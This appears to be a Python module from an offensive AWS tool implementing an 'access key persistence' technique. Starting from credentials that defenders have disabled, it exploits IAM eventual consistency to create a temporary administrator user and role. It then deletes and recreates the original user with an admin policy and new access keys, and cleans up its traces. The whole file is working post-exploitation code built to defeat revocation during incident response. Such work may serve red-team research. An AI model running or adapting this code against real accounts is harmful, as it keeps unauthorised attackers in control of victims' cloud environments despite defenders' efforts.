"""
Access Key Persistence Scenario (Scenario A).

This module implements the access key persistence technique that maintains
access even when defenders delete access keys or users. The technique exploits
AWS IAM eventual consistency by creating new users with access keys within
the ~4 second propagation window.
"""

import logging
from typing import Set

from .aws_clients import IAMClient, STSClient
from .models import Credentials, PolicyDocument
from .resource_names import generate_role_name, generate_user_name, generate_policy_name


logger = logging.getLogger(__name__)


class AccessKeyPersistence:
    """
    Implements access key persistence by rotating to new IAM users.
    
    When access keys are disabled or deleted, this class creates a temporary
    role, assumes it to get temporary credentials, creates a new IAM user with
    access keys, and then deletes the temporary role. This maintains persistent
    access even after defenders attempt to revoke it.
    
    Attributes:
        iam: IAM client for AWS API operations
        logger: Logger instance for operation logging
        created_users: Set of usernames created by this instance
    """
    
    def __init__(self, iam_client: IAMClient, logger_instance: logging.Logger = None):
        """
        Initialize AccessKeyPersistence.
        
        Args:
            iam_client: IAM client for AWS operations
            logger_instance: Optional logger instance (defaults to module logger)
        """
        self.iam = iam_client
        self.logger = logger_instance or logger
        self.created_users: Set[str] = set()
    
    def execute(self, current_credentials: Credentials, account_id: str, original_user_name: str) -> Credentials:
        """
        Execute the access key persistence scenario.
        
        This method maintains persistence on the ORIGINAL user identity by:
        1. Creating a temporary user with admin access
        2. Using temp user to delete and recreate the original user
        3. Creating new access keys for the recreated original user
        4. Deleting the temporary user
        
        This ensures we always operate on the same identity rather than creating new users.
        
        Args:
            current_credentials: Current AWS credentials (may be disabled but still valid)
            account_id: AWS account ID for trust policy
            original_user_name: Name of the original user to maintain persistence on
        
        Returns:
            Credentials: New persistent credentials for the recreated original user
        
        Raises:
            ClientError: If any AWS API operation fails
        """
        self.logger.info(f"Starting access key persistence scenario for original user: {original_user_name}")
        
        temp_role_name = None
        temp_policy_name = None
        temp_user_name = None
        temp_user_policy_name = None
        
        try:
            admin_policy = PolicyDocument.administrator_access()
            
            # Step 1: Create temporary IAM user (using disabled credentials - still valid)
            temp_user_name = generate_user_name()
            self.logger.info(f"Creating temporary user: {temp_user_name}")
            
            try:
                self.iam.create_user(user_name=temp_user_name)
                self.created_users.add(temp_user_name)
            except Exception as e:
                self.logger.error(
                    f"Failed to create temporary user {temp_user_name}: {str(e)}",
                    exc_info=True
                )
                raise
            
            # Step 2: Attach inline policy to temporary user (using disabled credentials)
            temp_user_policy_name = generate_policy_name()
            self.logger.info(f"Attaching policy {temp_user_policy_name} to temporary user {temp_user_name}")
            
            try:
                self.iam.put_user_policy(
                    user_name=temp_user_name,
                    policy_name=temp_user_policy_name,
                    policy_document=admin_policy.to_json()
                )
            except Exception as e:
                self.logger.error(
                    f"Failed to attach policy to temporary user {temp_user_name}: {str(e)}",
                    exc_info=True
                )
                # Clean up user before re-raising
                try:
                    self.iam.delete_user(temp_user_name)
                except:
                    pass
                raise
            
            # Step 3: Create temporary role with inline policy (using disabled credentials)
            temp_role_name = self._generate_temp_role_name()
            temp_policy_name = generate_policy_name()
            self.logger.info(f"Creating temporary role: {temp_role_name}")
            trust_policy = PolicyDocument.same_account_trust(account_id)
            
            try:
                self.iam.create_role(
                    role_name=temp_role_name,
                    assume_role_policy_document=trust_policy.to_json()
                )
            except Exception as e:
                self.logger.error(
                    f"Failed to create temporary role {temp_role_name}: {str(e)}",
                    exc_info=True
                )
                # Clean up user before re-raising
                try:
                    self.iam.delete_user_policy(temp_user_name, temp_user_policy_name)
                    self.iam.delete_user(temp_user_name)
                except:
                    pass
                raise
            
            # Attach policy to temporary role
            self.logger.info(f"Attaching policy {temp_policy_name} to temporary role")
            
            try:
                self.iam.put_role_policy(
                    role_name=temp_role_name,
                    policy_name=temp_policy_name,
                    policy_document=admin_policy.to_json()
                )
            except Exception as e:
                self.logger.error(
                    f"Failed to attach policy to temporary role {temp_role_name}: {str(e)}",
                    exc_info=True
                )
                # Clean up role and user before re-raising
                try:
                    self.iam.delete_role(temp_role_name)
                    self.iam.delete_user_policy(temp_user_name, temp_user_policy_name)
                    self.iam.delete_user(temp_user_name)
                except:
                    pass
                raise
            
            # Step 4: Assume role to get temporary credentials
            self.logger.info(f"Assuming temporary role: {temp_role_name}")
            temp_role_arn = f"arn:aws:iam::{account_id}:role/{temp_role_name}"
            sts_client = STSClient(current_credentials)
            
            try:
                temp_credentials = sts_client.assume_role(
                    role_arn=temp_role_arn,
                    role_session_name="notyet-temp-session"
                )
                
                # Store temp credentials for debugging (they'll be written to a profile later)
                self.temp_credentials = temp_credentials
                
            except Exception as e:
                self.logger.error(
                    f"Failed to assume temporary role {temp_role_name}: {str(e)}",
                    exc_info=True
                )
                # Clean up before re-raising
                try:
                    self.iam.delete_role_policy(temp_role_name, temp_policy_name)
                    self.iam.delete_role(temp_role_name)
                    self.iam.delete_user_policy(temp_user_name, temp_user_policy_name)
                    self.iam.delete_user(temp_user_name)
                except:
                    pass
                raise
            
            # Step 5: Create access keys for temporary user (using temporary role credentials)
            self.logger.info(f"Creating access keys for temporary user: {temp_user_name}")
            temp_iam_client = IAMClient(temp_credentials)
            
            try:
                response = temp_iam_client.create_access_key(user_name=temp_user_name)
                access_key = response['AccessKey']
                
                temp_user_credentials = Credentials(
                    access_key_id=access_key['AccessKeyId'],
                    secret_access_key=access_key['SecretAccessKey'],
                    session_token=None
                )
            except Exception as e:
                self.logger.error(
                    f"Failed to create access keys for temporary user {temp_user_name}: {str(e)}",
                    exc_info=True
                )
                # Clean up before re-raising
                try:
                    self.iam.delete_role_policy(temp_role_name, temp_policy_name)
                    self.iam.delete_role(temp_role_name)
                    self.iam.delete_user_policy(temp_user_name, temp_user_policy_name)
                    self.iam.delete_user(temp_user_name)
                except:
                    pass
                raise
            
            # Step 5b: Wait for temp user credentials to become valid (eventual consistency)
            self.logger.info("Waiting for temporary user credentials to become valid...")
            temp_user_sts_client = STSClient(temp_user_credentials)
            try:
                # This will retry with exponential backoff until credentials are valid
                temp_user_sts_client.get_caller_identity()
                self.logger.info("Temporary user credentials are now valid")
            except Exception as e:
                self.logger.error(
                    f"Temporary user credentials never became valid: {str(e)}",
                    exc_info=True
                )
                # Clean up before re-raising
                try:
                    self.iam.delete_role_policy(temp_role_name, temp_policy_name)
                    self.iam.delete_role(temp_role_name)
                    self.iam.delete_user_policy(temp_user_name, temp_user_policy_name)
                    self.iam.delete_user(temp_user_name)
                except:
                    pass
                raise
            
            # Step 6: Using temp user credentials, recreate the original user
            self.logger.info(f"Using temporary user credentials to recreate original user: {original_user_name}")
            temp_user_iam_client = IAMClient(temp_user_credentials)
            
            try:
                # Check if original user still exists
                user_exists = True
                try:
                    temp_user_iam_client._retry_with_backoff('get_user', UserName=original_user_name)
                    self.logger.info(f"Original user {original_user_name} still exists, will clean up and recreate")
                except Exception as e:
                    if "NoSuchEntity" in str(e):
                        user_exists = False
                        self.logger.info(f"Original user {original_user_name} already deleted by defender, will recreate directly")
                    else:
                        raise
                
                if user_exists:
                    # 6a: List and disable all access keys for original user
                    self.logger.info(f"Disabling all access keys for original user: {original_user_name}")
                    try:
                        response = temp_user_iam_client._retry_with_backoff('list_access_keys', UserName=original_user_name)
                        for key in response.get('AccessKeyMetadata', []):
                            key_id = key['AccessKeyId']
                            self.logger.info(f"Disabling access key: {key_id}")
                            temp_user_iam_client._retry_with_backoff('update_access_key', UserName=original_user_name, AccessKeyId=key_id, Status='Inactive')
                    except Exception as e:
                        self.logger.warning(f"Failed to disable access keys for {original_user_name}: {str(e)}")
                    
                    # 6b: Delete all inline policies from original user
                    self.logger.info(f"Deleting inline policies from original user: {original_user_name}")
                    try:
                        response = temp_user_iam_client._retry_with_backoff('list_user_policies', UserName=original_user_name)
                        for policy_name in response.get('PolicyNames', []):
                            self.logger.info(f"Deleting inline policy: {policy_name}")
                            temp_user_iam_client._retry_with_backoff('delete_user_policy', UserName=original_user_name, PolicyName=policy_name)
                    except Exception as e:
                        self.logger.warning(f"Failed to delete inline policies from {original_user_name}: {str(e)}")
                    
                    # 6c: Detach all managed policies from original user
                    self.logger.info(f"Detaching managed policies from original user: {original_user_name}")
                    try:
                        response = temp_user_iam_client._retry_with_backoff('list_attached_user_policies', UserName=original_user_name)
                        for policy in response.get('AttachedPolicies', []):
                            policy_arn = policy['PolicyArn']
                            self.logger.info(f"Detaching managed policy: {policy_arn}")
                            temp_user_iam_client._retry_with_backoff('detach_user_policy', UserName=original_user_name, PolicyArn=policy_arn)
                    except Exception as e:
                        self.logger.warning(f"Failed to detach managed policies from {original_user_name}: {str(e)}")
                    
                    # 6d: Delete all access keys from original user
                    self.logger.info(f"Deleting all access keys from original user: {original_user_name}")
                    try:
                        response = temp_user_iam_client._retry_with_backoff('list_access_keys', UserName=original_user_name)
                        for key in response.get('AccessKeyMetadata', []):
                            key_id = key['AccessKeyId']
                            self.logger.info(f"Deleting access key: {key_id}")
                            temp_user_iam_client._retry_with_backoff('delete_access_key', UserName=original_user_name, AccessKeyId=key_id)
                    except Exception as e:
                        self.logger.warning(f"Failed to delete access keys from {original_user_name}: {str(e)}")
                    
                    # 6e: Delete the original user
                    self.logger.info(f"Deleting original user: {original_user_name}")
                    temp_user_iam_client._retry_with_backoff('delete_user', UserName=original_user_name)
                
                # 6f: Recreate the original user (whether it existed or not)
                self.logger.info(f"Recreating original user: {original_user_name}")
                temp_user_iam_client._retry_with_backoff('create_user', UserName=original_user_name)
                
                # 6g: Attach admin policy to recreated original user
                original_user_policy_name = generate_policy_name()
                self.logger.info(f"Attaching policy {original_user_policy_name} to recreated original user")
                temp_user_iam_client._retry_with_backoff(
                    'put_user_policy',
                    UserName=original_user_name,
                    PolicyName=original_user_policy_name,
                    PolicyDocument=admin_policy.to_json()
                )
                
                # 6h: Create new access keys for recreated original user
                self.logger.info(f"Creating new access keys for recreated original user: {original_user_name}")
                response = temp_user_iam_client._retry_with_backoff('create_access_key', UserName=original_user_name)
                access_key = response['AccessKey']
                
                new_credentials = Credentials(
                    access_key_id=access_key['AccessKeyId'],
                    secret_access_key=access_key['SecretAccessKey'],
                    session_token=None
                )
                
            except Exception as e:
                self.logger.error(
                    f"Failed to recreate original user {original_user_name}: {str(e)}",
                    exc_info=True
                )
                # Don't clean up - leave temp user for manual recovery
                raise
            
            # Step 7: Delete temporary user (using temp user's own credentials)
            self.logger.info(f"Deleting temporary user: {temp_user_name}")
            try:
                # Delete inline policy first
                temp_user_iam_client._retry_with_backoff('delete_user_policy', UserName=temp_user_name, PolicyName=temp_user_policy_name)
                # Delete all access keys
                response = temp_user_iam_client._retry_with_backoff('list_access_keys', UserName=temp_user_name)
                for key in response.get('AccessKeyMetadata', []):
                    temp_user_iam_client._retry_with_backoff('delete_access_key', UserName=temp_user_name, AccessKeyId=key['AccessKeyId'])
                # Delete user
                temp_user_iam_client._retry_with_backoff('delete_user', UserName=temp_user_name)
                self.logger.info(f"Temporary user {temp_user_name} deleted successfully")
            except Exception as cleanup_error:
                self.logger.warning(
                    f"Failed to delete temporary user {temp_user_name}: {str(cleanup_error)}. "
                    f"Manual cleanup may be required."
                )
            
            # Step 8: Store temporary role info for cleanup after rotation
            self.temp_role_name = temp_role_name
            self.temp_policy_name = temp_policy_name
            
            self.logger.info(
                f"Access key persistence scenario completed. "
                f"Recreated original user: {original_user_name}, New access key: {new_credentials.access_key_id}"
            )
            
            return new_credentials
        
        except Exception as e:
            self.logger.error(f"Access key persistence scenario failed: {str(e)}")
            raise
    
    def _generate_temp_role_name(self) -> str:
        """
        Generate a temporary role name with the notyet-role-tmp- prefix.
        
        Returns:
            str: A role name in the format "notyet-role-tmp-{suffix}"
        """
        # Use the same suffix generation as other resources
        from .resource_names import generate_random_suffix
        suffix = generate_random_suffix()
        return f"notyet-role-tmp-{suffix}"
        return f"notyet-role-tmp-{suffix}"
